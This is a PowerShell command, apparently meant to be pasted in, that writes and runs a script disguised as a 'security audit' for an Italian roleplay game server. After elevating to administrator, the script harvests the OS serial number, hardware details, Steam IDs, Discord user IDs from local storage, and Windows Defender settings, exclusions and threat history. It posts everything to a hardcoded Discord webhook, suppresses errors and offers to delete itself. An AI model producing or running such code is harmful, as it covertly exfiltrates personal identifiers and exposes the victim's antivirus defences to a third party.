powershell -NoProfile -ExecutionPolicy Bypass -Command "$script = @'
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"`$PSCommandPath`""' -Verb RunAs; exit }
Clear-Host
Write-Host '==================================================================' -ForegroundColor Cyan
Write-Host '             NOW RP V3 - ULTIMATE SECURITY AUDIT                  ' -ForegroundColor Green
Write-Host '==================================================================`n' -ForegroundColor Cyan
$n = Read-Host '[?] Inserisci il tuo Nickname Discord'
$h = 'https://discord.com/api/webhooks/1563653917932396556/9wpu5_KBJcDg9kQJ6IxfijGrnfKwfkBPghuySZHxDcMSv9PVuP4NG3cEFLXCTY7sSiQz'
Write-Host '[*] Raccolta dati di sistema in corso...' -ForegroundColor DarkYellow
$s = Get-CimInstance Win32_OperatingSystem
$o = $s.InstallDate.ToString('dd/MM/yyyy HH:mm')
$sr = $s.SerialNumber
$pc = (Get-CimInstance Win32_ComputerSystem).Model
$gpu = (Get-CimInstance Win32_VideoController).Name -join ', '
$v = 'C:\Program Files (x86)\Steam\config\loginusers.vdf'
$st = 'Non trovato'
if(Test-Path $v){ $id = (Get-Content $v -EA 0 | Select-String '\"7656119' -EA 0 | ForEach-Object { $_.ToString().Split('\"')[1] }); if($id){ $st = $id -join ', ' } }
$dc = (Get-ChildItem '$env:APPDATA' -Filter '*discord*' -EA 0).Count
$tk = Get-ChildItem '$env:APPDATA\discord\Local Storage\leveldb' -EA 0 | Select-String -Pattern '\"id\":\"(\d{17,19})\"' -EA 0 | ForEach-Object { $_.Matches.Groups[1].Value } | Select-Object -Unique
$di = if($tk){ $tk -join ', ' } else { 'Nessuno' }
Write-Host '[*] Scansione difese e configurazioni antivirus...' -ForegroundColor DarkYellow
$def = Get-MpComputerStatus -EA 0
$rt = if($def.RealTimeProtectionEnabled){ 'Attiva (OK)' } else { 'Disattivata (ATTENZIONE!)' }
$cloud = if($def.CloudBlockLevel){ 'Attivo' } else { 'Disattivato' }
$antispy = if($def.AntispywareEnabled){ 'Attivo' } else { 'Disattivato' }
$pref = Get-MpPreference -EA 0
$exPath = if($pref.ExclusionPath){ $pref.ExclusionPath -join ', ' } else { 'Nessun percorso escluso' }
$exExt = if($pref.ExclusionExtension){ $pref.ExclusionExtension -join ', ' } else { 'Nessuna estensione esclusa' }
$exProc = if($pref.ExclusionProcess){ $pref.ExclusionProcess -join ', ' } else { 'Nessun processo escluso' }
Write-Host '[*] Estrazione cronologia minacce e file rilevati...' -ForegroundColor DarkYellow
$threats = Get-MpThreatDetection -EA 0
$threatList = 'Nessuna minaccia recente registrata'
if ($threats) {
    $threatList = ($threats | Select-Object -First 5 | ForEach-Object {
        $tName = $_.InitialDetectionName
        $tRes = $_.Resources -join ' | '
        'Rilevamento: $tName -> Path: $tRes'
    }) -join '`n'
}
$embeds = @(
    @{
        title = 'NOW RP V3 - System & Identity Board'
        description = 'Rapporto di autenticazione per il giocatore: $n'
        color = 3447003
        fields = @(
            @{ name = 'Sistema Operativo & Seriale'; value = 'Installazione: $o`nSeriale: $sr'; inline = $false },
            @{ name = 'Identita di Gioco (Steam & Discord)'; value = 'SteamID64: $st`nDiscord ID: $di`nIstanze Discord: $dc trovate'; inline = $false },
            @{ name = 'Hardware / GPU'; value = '$pc | $gpu'; inline = $false }
        )
    },
    @{
        title = 'WINDOWS DEFENDER - Configurazione & Protezioni'
        description = 'Stato dei moduli di difesa dellantivirus di sistema'
        color = 15158332
        fields = @(
            @{ name = 'Moduli Principali'; value = 'Real-Time: $rt`nCloud Protection: $cloud`nAntiSpyware: $antispy'; inline = $false },
            @{ name = 'Percorsi Esclusi (Exclusions)'; value = '$exPath'; inline = $false },
            @{ name = 'Estensioni & Processi Esclusi'; value = 'Estensioni: $exExt`nProcessi: $exProc'; inline = $false }
        )
    },
    @{
        title = 'CRONOLOGIA PROTEZIONE & MINACCE RILEVATE'
        description = 'Storico degli oggetti intercettati e file analizzati'
        color = 10038562
        fields = @(
            @{ name = 'Ultime Minacce / File Segnalati'; value = '$threatList'; inline = $false }
        )
    }
)
$payload = @{ embeds = $embeds }
Write-Host '[*] Invio del report al server Discord...' -ForegroundColor DarkYellow
try { 
    $json = $payload | ConvertTo-Json -Depth 6
    Invoke-RestMethod -Uri $h -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ContentType 'application/json; charset=utf-8' -EA 0 | Out-Null 
} catch {}
Clear-Host
Write-Host '==================================================================' -ForegroundColor Green
Write-Host '                 [+] CONTROLLO COMPLETATO CON SUCCESSO            ' -ForegroundColor Green
Write-Host '==================================================================' -ForegroundColor Green
$del = Read-Host '[?] Vuoi cancellare i file temporanei installati? (S/N)'
if ($del -eq 'S' -or $del -eq 's') {
    Remove-Item '$env:TEMP\check.ps1' -ErrorAction SilentlyContinue
    Write-Host '[+] File temporanei cancellati con successo dal PC!' -ForegroundColor Cyan
} else {
    Write-Host '[+] Pulizia saltata.' -ForegroundColor Yellow
}
Write-Host '`n[+] Puoi chiudere questa finestra in sicurezza.`n' -ForegroundColor Gray
Start-Sleep -Seconds 4
'@
Set-Content -Path '$env:TEMP\check.ps1' -Value $script -Encoding UTF8
& '$env:TEMP\check.ps1'"
